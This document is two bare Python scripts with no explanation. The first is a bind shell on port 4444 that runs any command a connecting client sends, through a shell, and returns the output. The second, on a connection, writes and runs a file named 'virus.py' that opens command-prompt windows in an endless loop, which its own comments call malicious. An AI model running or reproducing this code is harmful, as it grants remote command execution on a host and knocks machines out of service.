#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import subprocess

host = 'localhost'
port = 4444
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(1)
print ('[+] Listening for incoming TCP connection on port 4444')
conn, addr = s.accept()
print ('[+] We got a connection from ', addr )

while True:
    command = conn.recv(1024)

    if 'terminate' in command:
        conn.send('Goodbye')
        conn.close()
        break 

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        conn.send(CMD.stdout.read() ) 
        conn.send(CMD.stderr.read() )



import os,socket

host = '<ip address>'
port = 4444

# create a socket object 
s = socket.socket()

# bind to the port 
s.bind((host,port))

# listening for one incoming connection 
s.listen(1)

# accept connection and get client data 
conn, addr = s.accept()
print("Connected by", addr)

# creating file in system 
os.system('touch virus.py')

# write malicious code in created file 
f = open('virus.py','wb') 
f.write(""" 
# malicous code here 
import os 
while True: 
    os.system("start cmd.exe") 
""") 
f.close() 

# execute virus 
os.system("python virus.py")

# close connection with client 
conn.close()